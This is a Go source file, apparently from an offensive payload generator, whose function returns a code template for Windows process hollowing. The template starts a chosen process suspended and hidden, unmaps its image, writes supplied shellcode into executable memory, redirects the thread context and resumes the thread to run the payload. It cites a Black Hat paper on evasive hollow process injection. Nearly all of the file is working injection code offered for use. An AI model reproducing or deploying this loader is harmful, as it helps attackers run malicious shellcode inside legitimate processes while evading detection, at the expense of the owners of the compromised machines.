package loaders

import (
	"fmt"
)

/*
   adapted from go-runpe:
   https://github.com/abdullah2993/go-runpe

   For more information, feel free to read this:
   https://www.blackhat.com/docs/asia-17/materials/asia-17-KA-What-Malware-Authors-Don't-Want-You-To-Know-Evasive-Hollow-Process-Injection-wp.pdf
*/

func GetProcessHollowingTemplate(targetProcess string) string {

	println("\n[!] Please be aware ProcessHollowing implementation is still a work in progress and unstable.")
	println("Maybe you could use another technique instead...? I hear the CRT one is pretty good...\n")

	return fmt.Sprintf(`
package main

import (
    "os/exec"
    "path/filepath"
	"bytes"
	"debug/pe"
	"encoding/binary"
	"io/ioutil"
	"syscall"
	"unsafe"
)


const (
    CREATE_SUSPENDED          = 0x00000004
    CREATE_NO_WINDOW          = 0x08000000

    MEM_COMMIT                = 0x00001000
    MEM_RESERVE               = 0x00002000
    PAGE_EXECUTE_READWRITE    = 0x00000040
)

var (
	modkernel32         = syscall.MustLoadDLL("kernel32.dll")
	WriteProcessMemory  = modkernel32.MustFindProc("WriteProcessMemory")
	ReadProcessMemory   = modkernel32.MustFindProc("ReadProcessMemory")
	VirtualAllocEx      = modkernel32.MustFindProc("VirtualAllocEx")
	GetThreadContext    = modkernel32.MustFindProc("GetThreadContext")
	SetThreadContext    = modkernel32.MustFindProc("SetThreadContext")
	ResumeThread        = modkernel32.MustFindProc("ResumeThread")

	modntdll                = syscall.MustLoadDLL("ntdll.dll")
	NtUnmapViewOfSection    = modntdll.MustFindProc("NtUnmapViewOfSection")
)


func createProcess(processName string) *syscall.ProcessInformation {
    var si syscall.StartupInfo
	var pi syscall.ProcessInformation

	commandLine, err := syscall.UTF16PtrFromString(processName); if err != nil {
		panic(err)
	}

    err = syscall.CreateProcess(
		nil,
		commandLine,
		nil,
		nil,
		false,
		CREATE_SUSPENDED | CREATE_NO_WINDOW,
		nil,
		nil,
		&si,
		&pi,
    ); if err != nil {
		panic(err)
	}

	return &pi
}

func readProcessAddr(hProcess uintptr, addr uintptr) (uintptr, error) {
    size := 8

    var numBytesRead uintptr
    data := make([]byte, size)

	r, _, err := ReadProcessMemory.Call(
        hProcess,
		addr,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(size),
		uintptr(unsafe.Pointer(&numBytesRead)),
    )
	if r == 0 {
        return 0, err
	}

	return uintptr(binary.LittleEndian.Uint64(data)), nil
}

func findProgramPath(filename string) (string, error) {
    fname, err := exec.LookPath(filename); if err != nil {
        return "", err
    }
    return filepath.Abs(fname)
}


func ExecuteOrderSixtySix(shellcode []byte) {
    // target process
    processName := "%s"
    process := createProcess(processName)

    // process & thread handles
    hProcess := uintptr(process.Process)
    hThread := uintptr(process.Thread)

    // get thread context
    ctx := make([]uint8, 0x4d0)
    binary.LittleEndian.PutUint32(ctx[48:], 0x00100000|0x00000002)
    ctxPtr := unsafe.Pointer(&ctx[0])

    r, _, err := GetThreadContext.Call(hThread, uintptr(ctxPtr)); if r == 0 {
        panic(err)
    }

    /*
        https://stackoverflow.com/questions/37656523/declaring-context-struct-for-pinvoke-windows-x64
        https://bytepointer.com/resources/tebpeb64.htm
    */
    remoteRdx := binary.LittleEndian.Uint64(ctx[136:])
    imageBaseAddr, _ := readProcessAddr(hProcess, uintptr(remoteRdx + 16));
    programPath, err := findProgramPath(processName); if err != nil {
        panic(err)
    }

    destPE, err := ioutil.ReadFile(programPath); if err != nil {
		panic(err)
	}

	destPEReader := bytes.NewReader(destPE)
	f, err := pe.NewFile(destPEReader); if err != nil {
        panic(err)
    }

    oh, ok := f.OptionalHeader.(*pe.OptionalHeader64); if !ok {
		panic("OptionalHeader64 not found")
	}

    /* unmapping image from process */
    r, _, err = NtUnmapViewOfSection.Call(
        hProcess,
        imageBaseAddr,
    );

    /* allocating data */
    newBaseImage, _, err := VirtualAllocEx.Call(
        hProcess,
        imageBaseAddr,
        uintptr(len(shellcode)),
        uintptr(MEM_COMMIT | MEM_RESERVE),
        uintptr(PAGE_EXECUTE_READWRITE),
    ); if newBaseImage == 0 {
        panic(err)
    }

    /* writing program to memory */
    var numBytesRead uintptr
    r, _, err = WriteProcessMemory.Call(
        hProcess,
        newBaseImage,
        uintptr(unsafe.Pointer(&shellcode[0])),
        uintptr(len(shellcode)),
        uintptr(unsafe.Pointer(&numBytesRead)),
    ); if r == 0 {
        panic(err)
    }

    /* writing new image base to rdx */
    addr := make([]byte, 8)
	binary.LittleEndian.PutUint64(addr, uint64(newBaseImage))
	r, _, err = WriteProcessMemory.Call(
        hProcess,
        uintptr(remoteRdx + 16),
        uintptr(unsafe.Pointer(&addr)),
        uintptr(8),
        uintptr(unsafe.Pointer(&numBytesRead)),
    ); if r == 0 {
		panic(err)
	}

    /* setting thread context again ! */
    binary.LittleEndian.PutUint64(
        ctx[128:],
        uint64(newBaseImage) + uint64(oh.AddressOfEntryPoint),
    )
    r, _, err = SetThreadContext.Call(
        hThread,
        uintptr(unsafe.Pointer(&ctx[0])),
    ); if r == 0 {
        panic(err)
    }

    /* Resuming thread and execute payload */
    r, _, err = ResumeThread.Call(hThread); if r == 0xfffffff {
        panic(err)
    }
}
    `, targetProcess)
}
